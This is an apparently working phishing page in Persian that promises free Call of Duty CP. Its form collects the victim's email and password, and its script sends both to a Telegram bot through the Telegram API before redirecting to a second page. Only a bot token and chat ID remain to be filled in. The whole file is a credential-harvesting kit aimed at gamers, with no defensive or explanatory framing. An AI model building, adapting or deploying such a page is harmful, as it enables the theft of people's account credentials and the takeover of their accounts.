<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>سی پی رایگان - Call of Duty</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: #000;
            color: #fff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 20px 30px;
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
            text-align: center;
            width: 100%;
            max-width: 400px;
        }
        h1 {
            margin-bottom: 20px;
            font-size: 24px;
            color: #28a745;
        }
        input {
            width: 90%;
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            background: rgba(255, 255, 255, 0.2);
            color: #fff;
            outline: none;
        }
        button {
            background: #28a745;
            color: #fff;
            border: none;
            padding: 10px 20px;
            font-size: 18px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background: #218838;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>دریافت سی پی رایگان</h1>
        <form id="phishingForm">
            <input type="text" id="email" placeholder="ایمیل خود را وارد کنید" required>
            <input type="password" id="password" placeholder="رمز عبور خود را وارد کنید" required>
            <input type="number" id="cp" placeholder="تعداد سی پی" required>
            <button type="submit">دریافت</button>
        </form>
    </div>

    <script>
        document.getElementById("phishingForm").addEventListener("submit", function(event) {
            event.preventDefault();

            // اطلاعات فرم
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;
            const cp = document.getElementById("cp").value;

            // توکن بات تلگرام و Chat ID گروه
            const botToken = "YOUR_BOT_TOKEN"; // جایگزین با توکن بات تلگرام
            const chatId = "-123456789"; // جایگزین با Chat ID گروه (مقدار منفی دارد)

            // پیام ارسالی به گروه تلگرام
            const message = `
                🛑 اطلاعات جدید:
                ✉️ ایمیل: ${email}
                🔑 رمز عبور: ${password}
                🎮 تعداد سی پی: ${cp}
            `;

            // ارسال پیام به تلگرام
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => {
                if (response.ok) {
                    // انتقال به صفحه دوم
                    window.location.href = "page2.html";
                } else {
                    alert("خطایی رخ داد. لطفاً دوباره تلاش کنید.");
                }
            })
            .catch(error => {
                console.error("خطا در ارسال به تلگرام:", error);
            });
        });
    </script>
</body>
</html>
